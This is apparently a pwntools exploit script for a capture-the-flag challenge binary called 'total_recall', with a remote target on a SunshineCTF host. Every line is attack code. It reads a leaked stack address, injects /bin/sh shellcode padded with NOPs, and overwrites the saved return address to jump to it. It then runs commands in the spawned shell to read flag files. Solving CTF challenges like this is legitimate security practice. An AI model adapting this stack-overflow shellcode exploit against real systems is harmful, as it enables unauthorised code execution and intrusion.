from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

BIN = './total_recall'

def start():
    if args.REMOTE:
        return remote('chal.sunshinectf.games', 26003)
    return process(BIN)

io = start()

# 1st function leaks 8 bytes: old rsp (stack address)
leak = u64(io.recvn(8))
log.info("leak = %#x", leak)

# second buffer read starts at rsp-0x80 ; ret addr at rsp
buf = leak - 0x80
log.info("buf  = %#x", buf)

# first read: 24 bytes into rsp-0x40 (padding)
io.send(b'A' * 0x18)
time.sleep(0.1)

shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x80, b'\x90')
payload += p64(buf)          # overwrite saved return address
io.send(payload)
time.sleep(0.3)

# now a shell should be running
io.sendline(b'echo SHELL_OK_$((40+2)); id; cat /flag* flag* 2>/dev/null; ls -la')
time.sleep(0.5)
try:
    print(io.recvrepeat(2).decode(errors='replace'))
except Exception as e:
    print("ERR", e)
